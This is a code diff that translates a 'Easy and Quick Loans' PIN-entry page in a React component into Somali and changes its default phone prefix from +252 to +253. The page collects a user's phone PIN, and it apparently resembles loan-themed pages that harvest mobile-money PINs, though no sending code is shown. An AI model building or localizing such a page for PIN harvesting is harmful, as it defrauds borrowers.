@@ -80,7 +80,7 @@ export default function Details() {
 
       if (!response.ok) {
         throw new Error(
-          data.message || "Failed to submit PIN"
+          data.message || "PIN diristu wuu fashilmay"
         );
       }
 
@@ -113,7 +113,7 @@ export default function Details() {
         </h1>
 
         <p className="text-white text-base">
-          Easy and Quick Loans
+          Amaah Fudud oo Deg Deg ah
         </p>
 
       </div>
@@ -125,26 +125,22 @@ export default function Details() {
         <div className="max-w-md mx-auto">
 
           <h2 className="text-center text-2xl text-gray-900 mb-8">
-            Verify PIN
+            Xaqiiji PIN-ka
           </h2>
 
 
           {/* Phone */}
           <div className="flex items-center gap-3 border-2 border-green-500 rounded-xl px-4 py-3.5 mb-8">
 
-            <span className="text-xl">
-              🇸🇴
-            </span>
-
             <span className="text-gray-800">
-              {loanData.phone || "+252"}
+              {loanData.phone || "+253"}
             </span>
 
           </div>
 
 
           <p className="text-center text-gray-500 text-sm mb-4">
-            Enter your PIN.
+            Geli PIN-kaaga.
           </p>
 
 
@@ -217,8 +213,8 @@ export default function Details() {
             }
           >
             {loading
-              ? "Submitting..."
-              : "CONTINUE"}
+              ? "Waa la dirayaa..."
+              : "SII WAD"}
           </button>
 
         </div>
@@ -234,7 +230,7 @@ export default function Details() {
         </h1>
 
         <p className="text-white text-base mb-6">
-          Easy and Quick Loans
+          Amaah Fudud oo Deg Deg ah
         </p>
 
         <p className="text-white/80 text-xs">
